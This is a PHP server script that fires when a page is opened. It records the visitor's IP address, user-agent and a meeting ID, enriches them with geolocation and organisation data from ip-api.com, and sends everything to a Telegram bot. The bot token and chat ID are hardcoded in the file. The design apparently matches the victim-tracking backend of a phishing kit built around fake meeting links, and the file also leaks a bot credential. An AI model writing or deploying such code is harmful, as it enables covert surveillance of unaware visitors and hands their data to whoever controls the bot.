<?php
// =====================================================
// CONFIGURATION SECTION — EDIT THESE
// =====================================================
$TELEGRAM_BOT_TOKEN = "7284066719:AAFmrZ2q7kWos3sAwvigTquNtFwGEjN3JGY";  // e.g. 123456:ABC-xyz
$TELEGRAM_CHAT_ID   = "7724482403";         // e.g. 987654321
// =====================================================


header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

$input = json_decode(file_get_contents('php://input'), true);

function getRealIP() {
    $headers = ['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_REAL_IP', 'REMOTE_ADDR'];
    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            $ip = $_SERVER[$header];

            if (strpos($ip, ',') !== false) {
                $ip = trim(explode(',', $ip)[0]);
            }
            if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $ip;
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'unknown';
}


// Check Telegram config
if ($TELEGRAM_BOT_TOKEN === "REPLACE_WITH_TELEGRAM_TOKEN" ||
    $TELEGRAM_CHAT_ID === "REPLACE_WITH_CHAT_ID") {

    http_response_code(500);
    echo json_encode(['error' => 'Telegram configuration missing at top of file']);
    exit();
}


$ip = getRealIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
$timestamp = date('Y-m-d H:i:s');
$meetingId = $input['meetingId'] ?? 'unknown';

$country = '';
$region = '';
$org = '';
$hostname = '';

$geoUrl = "http://ip-api.com/json/{$ip}?fields=status,country,regionName,org,reverse";

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $geoUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
$geoResponse = curl_exec($ch);
curl_close($ch);

if ($geoResponse) {
    $geoData = json_decode($geoResponse, true);
    if ($geoData && ($geoData['status'] ?? '') === 'success') {
        $country = $geoData['country'] ?? '';
        $region = $geoData['regionName'] ?? '';
        $org = $geoData['org'] ?? '';
        $hostname = $geoData['reverse'] ?? '';
    }
}


// Prepare Telegram message
$message  = "🔔 *Page Opened*\n\n";
$message .= "📅 Time: `{$timestamp}`\n";
$message .= "🆔 Meeting ID: `{$meetingId}`\n";
$message .= "📌 IP Address: `{$ip}`\n";
$message .= "🏳 Country: `{$country}`\n";
$message .= "📍 Region: `{$region}`\n";
$message .= "🏢 Organisation: `{$org}`\n";
$message .= "🔗 Hostname: `{$hostname}`\n";
$message .= "🖥 User-Agent: `{$userAgent}`";


// Send to Telegram
$telegramUrl = "https://api.telegram.org/bot{$TELEGRAM_BOT_TOKEN}/sendMessage";

$postData = [
    'chat_id' => $TELEGRAM_CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $telegramUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);


if ($httpCode === 200) {
    echo json_encode([
        'success' => true,
        'message' => 'Notification sent'
    ]);
} else {
    error_log("Telegram API error: " . $response);
    echo json_encode([
        'success' => false,
        'message' => 'Failed to send notification'
    ]);
}

?>
